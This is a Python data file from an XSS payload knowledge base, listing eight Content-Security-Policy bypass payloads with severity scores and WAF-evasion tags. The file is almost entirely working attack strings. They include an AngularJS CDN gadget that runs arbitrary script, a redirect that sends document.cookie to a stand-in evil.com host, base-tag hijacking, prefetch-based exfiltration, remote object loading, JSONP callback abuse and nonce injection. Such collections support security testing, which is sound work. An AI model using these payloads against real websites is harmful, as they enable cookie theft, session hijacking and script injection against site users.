#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

CSP Bypass Payloads
"""

from ..models import PayloadEntry


CSP_BYPASS_PAYLOADS = {
    "csp_1": PayloadEntry(
        payload="<script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="CSP bypass via AngularJS CDN",
        tags=["csp", "bypass", "angular", "cdn"],
        waf_evasion=True,
        reliability="medium",
    ),
    "csp_2": PayloadEntry(
        payload="<script src='https://www.google.com/recaptcha/api.js'></script><script>document.location='//evil.com/'+document.cookie</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="CSP bypass via Google script",
        tags=["csp", "bypass", "google"],
        waf_evasion=True,
        reliability="low",
    ),
    "csp_3": PayloadEntry(
        payload="<base href='https://evil.com/'>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Base tag hijacking for CSP bypass",
        tags=["csp", "bypass", "base", "hijack"],
        waf_evasion=True,
        reliability="medium",
    ),
    "csp_4": PayloadEntry(
        payload="<link rel=prefetch href='//evil.com/'>",
        contexts=["html_content"],
        severity="medium",
        cvss_score=6.5,
        description="Link prefetch for CSP bypass (data exfil)",
        tags=["csp", "bypass", "prefetch", "exfil"],
        waf_evasion=True,
        reliability="medium",
    ),
    "csp_5": PayloadEntry(
        payload="<meta http-equiv='Content-Security-Policy' content=\"script-src 'unsafe-inline'\">",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Meta CSP override (must be first)",
        tags=["csp", "bypass", "meta"],
        reliability="low",
    ),
    "csp_6": PayloadEntry(
        payload="<object data='//evil.com/xss.swf'>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Object tag for CSP bypass (plugins)",
        tags=["csp", "bypass", "object", "flash"],
        reliability="low",
    ),
    "csp_7": PayloadEntry(
        payload="<script src='/api/jsonp?callback=alert(1)//'>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="JSONP callback for CSP bypass",
        tags=["csp", "bypass", "jsonp", "callback"],
        waf_evasion=True,
        reliability="high",
    ),
    "csp_8": PayloadEntry(
        payload="<script nonce='${nonce}'>alert(1)</script>",
        contexts=["html_content", "template_injection"],
        severity="critical",
        cvss_score=8.5,
        description="Nonce injection (template)",
        tags=["csp", "bypass", "nonce", "template"],
        reliability="low",
    ),
}

CSP_BYPASS_PAYLOADS_TOTAL = len(CSP_BYPASS_PAYLOADS)
